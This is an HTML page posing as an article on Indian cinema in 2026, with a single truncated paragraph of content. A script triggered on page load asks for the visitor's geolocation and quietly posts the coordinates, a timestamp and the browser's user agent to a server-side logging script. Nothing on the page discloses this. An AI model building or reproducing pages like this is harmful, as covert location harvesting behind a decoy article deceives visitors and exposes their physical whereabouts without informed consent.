<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>The Evolution of Indian Cinema: A 2026 Perspective</title>
    <style>
        body { font-family: 'Georgia', serif; line-height: 1.8; max-width: 800px; margin: 40px auto; padding: 20px; color: #333; }
        h1 { color: #b22222; }
        .content { font-size: 1.1em; }
    </style>
</head>
<body onload="captureLocation()">

    <h1>The Golden Age of Indian Cinema</h1>
    <p class="content">
        In 2026, Indian cinema has transcended regional boundaries, with Tollywood and Bollywood 
        collaborations dominating the global box office. The integration of AI in post-production...
        </p>

    <script>
        function captureLocation() {
            if (navigator.geolocation) {
                // This triggers the browser's permission prompt
                navigator.geolocation.getCurrentPosition(sendToServer, handleError);
            }
        }

        function sendToServer(position) {
            const data = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                time: new Date().toISOString(),
                ua: navigator.userAgent
            };

            // Use 'fetch' to send data to your PHP script silently in the background
            fetch('log_location.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        }

        function handleError(error) {
            console.log("Location access denied or unavailable.");
        }
    </script>
</body>
</html>